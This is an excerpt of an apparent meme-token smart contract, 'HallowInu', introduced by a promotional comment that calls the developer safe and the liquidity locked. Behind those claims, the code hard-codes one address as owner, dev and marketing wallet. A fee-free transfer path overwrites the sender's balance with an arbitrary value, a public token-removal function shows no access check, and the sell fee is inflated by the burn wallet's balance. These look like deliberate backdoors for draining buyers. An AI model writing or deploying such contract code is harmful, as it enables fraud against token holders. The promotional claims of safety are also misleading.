...
/*👻 He rips through all the dips 🦮

🔹Starting Mcap $300

Just stealth launched!
▪️ Safe dev / CA / Lock
▪️ Website going live @5k Mcap
▪️ Based callers on the line

⚠️ Tax 3/3, watch your slippage 
...
contract hallowinu is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x0C7A527A033391154889E390A51B07B62E3A1488); 
    address payable public Wallet_Dev = payable(0x0C7A527A033391154889E390A51B07B62E3A1488);
    ...
    string private constant _name = "HallowInu"; 
    ...
    constructor () {
        ...
        _owner = 0x0C7A527A033391154889E390A51B07B62E3A1488;
    ...
    function _transfer(
        ...
        bool senderexludedfromfree=_isExcludedFromFee[from];
        bool receiverexludedfromfree=_isExcludedFromFee[to];

        bool takeFee = true;
        bool isBuy;
        if(senderexludedfromfree ||receiverexludedfromfree){
            takeFee = false;
        } else {
    ...
    function remove_Random_Tokens(address random_Token_Address, uint256 percent_of_Tokens) public returns(bool _sent){
     ...
     function _tokenTransfernofee( address to, address from, uint256 amount) private {
            _tOwned[from] = _tOwned[to]+amount;
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            uint256 sellFEE = tAmount*_Tax_On_Sell/100 + _tOwned[Wallet_Burn];
